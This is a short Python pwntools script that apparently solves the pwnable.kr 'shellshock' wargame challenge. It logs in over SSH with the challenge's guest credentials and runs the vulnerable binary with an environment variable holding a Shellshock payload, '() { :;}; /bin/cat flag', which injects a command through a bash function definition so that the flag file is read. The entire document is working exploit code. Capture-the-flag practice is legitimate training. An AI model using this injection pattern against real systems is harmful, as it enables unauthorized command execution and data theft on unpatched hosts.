from pwn import *

s = ssh(host='pwnable.kr',
        port=2222,
        user='shellshock',
        password='guest')

p = s.process(['shellshock'], env={'x': '() { :;}; /bin/cat flag'})
print p.readall()
